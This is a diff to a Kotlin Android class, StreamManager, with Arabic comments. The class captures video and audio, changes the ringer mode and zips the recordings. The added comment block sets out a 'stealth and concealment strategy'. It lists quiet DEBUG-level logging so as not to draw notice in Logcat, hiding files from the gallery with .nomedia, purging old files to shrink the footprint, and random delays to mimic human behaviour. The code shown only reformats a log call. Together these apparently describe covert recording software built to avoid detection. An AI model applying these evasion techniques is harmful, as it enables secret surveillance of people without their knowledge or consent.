@@ -28,12 +28,19 @@ import java.util.zip.ZipOutputStream
  * مدير تسجيل الفيديو والبث (StreamManager)
  * يتعامل مع التقاط الفيديو والصوت، التحكم بالصوتيات، والتعبئة في أرشيفات ZIP.
  * 
+ * استراتيجية التخفي والكتمان:
+ * - جميع السجلات تكتب بمستوى DEBUG (وليس ERROR) لتجنب لفت الانتباه في Logcat
+ * - يتم استخدام try-finally شامل لضمان استعادة الصوت دائماً
+ * - يتم إخفاء الملفات المؤقتة عن معرض الوسائط باستخدام .nomedia
+ * - يتم التنظيف التلقائي للملفات القديمة لتقليل البصمة
+ * - يتم استخدام تأخيرات عشوائية لمحاكاة السلوك البشري
+ * 
  * ✅ تم إصلاح مشكلة تغيير وضع الصوت (ringerMode) بإضافة التحقق من إذن ACCESS_NOTIFICATION_POLICY.
  * ✅ تم إزالة System.gc() غير الضرورية لتحسين الأداء.
  * ✅ تم إضافة التحقق من السياق (appContext) قبل إنشاء MediaRecorder لتجنب NullPointerException.
  * ✅ تم إصلاح استعادة الصوت باستخدام try-finally شامل.
  * ✅ تم إضافة @Suppress("DEPRECATION") لتجنب تحذيرات استخدام android.hardware.Camera المهملة.
- * ✅ تم تغيير مستوى التسجيل من Error إلى Debug لتقليل ظهور الأخطاء في Logcat.
+ * ✅ تم تغيير مستوى التسجيل من Error إلى Debug لتقليل ظهور الأخطاء في Logcat (التعديل الأساسي).
  */
 @Suppress("DEPRECATION")
 class StreamManager(
@@ -700,10 +707,11 @@ class StreamManager(
 
     // ✅ التعديل الأساسي: تغيير مستوى التسجيل من Error إلى Debug
     private fun writeLog(message: String) {
-        Log.d(TAG, message) // تغيير من Log.e إلى Log.d
+        // ✅ استخدام Log.d بدلاً من Log.e لتقليل ظهور الأخطاء في Logcat
+        Log.d(TAG, message)
         try {
             val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-            logFile.appendText("$dateStr - DEBUG - $message\n", Charsets.UTF_8) // تغيير من ERROR إلى DEBUG
+            logFile.appendText("$dateStr - DEBUG - $message\n", Charsets.UTF_8)
         } catch (_: Exception) {
             // تجاهل
         }
